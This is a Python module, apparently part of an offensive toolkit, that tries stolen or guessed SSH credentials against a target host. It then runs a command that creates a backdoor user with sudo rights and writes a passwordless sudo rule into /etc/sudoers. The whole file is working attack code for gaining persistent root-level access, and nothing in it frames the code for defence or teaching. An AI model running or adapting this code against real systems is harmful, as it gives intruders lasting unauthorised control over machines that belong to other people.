'''
name : SSH Create User Backdoor Module
description : This module creates a new user on the target system with SSH access.
version : 1.0
author : Ayato
'''

import paramiko
import time

def try_access(ip, username, password, cmd):
    print(f"[*] Trying {username}:{password} on {ip}")
    time.sleep(1)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password,
            timeout=10, allow_agent=False, look_for_keys=False
        )
        print(f"[+] Successful login: {username}:{password} on {ip}")
        stdin, stdout, stderr = ssh.exec_command(cmd)
        result = stdout.read().decode().replace('\n', '')
        print(f"[*] Command output: {result}")
        ssh.close()
        return result
    except paramiko.ssh_exception.SSHException as e:
        print(f"[-] SSH protocol error on {ip}: {e}")
        return False
    except Exception as e:
        print(f"[-] Error on {ip}: {e}")
        return False

def try_create_user(ip, username, password, backdoor_username, backdoor_password, echo_cmd):
    cmd = f'{echo_cmd} && sudo useradd -m -p $(openssl passwd -1 {backdoor_password}) {backdoor_username} && sudo usermod -aG sudo {backdoor_username} && echo "{backdoor_username} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && echo "User {backdoor_username} created with sudo privileges."'
    print(f"[*] Attempting to create backdoor user {backdoor_username} on {ip}")
    result = try_access(ip, username, password, cmd)
    if "created" in result:
        print(f"[+] Backdoor user {backdoor_username} created successfully on {ip}")
        return True
    else:
        print(f"[-] Failed to create backdoor user {backdoor_username} on {ip} with {username}:{password}")
        return False

def run(ip, avaliable_credentials, backdoor_credentials, cmd):
    print("[*] Running SSH create user backdoor module...")
    print(f"[*] Target IP: {ip}")
    print(f"[*] Available credentials: {str(avaliable_credentials)[0:30]}{'...' if len(str(avaliable_credentials)) > 30 else ''}")
    created = {}
    for username, password in avaliable_credentials.items():
        for backdoor_username, backdoor_password in backdoor_credentials.items():
            if try_create_user(ip, username, password, backdoor_username, backdoor_password, cmd):
                print(f"[+] Backdoor user {backdoor_username} created on {ip} using {username}:{password}")
                created[backdoor_username] = backdoor_password
    if not created:
        print("[-] No backdoor users were created.")
        return -1
    return 0
    
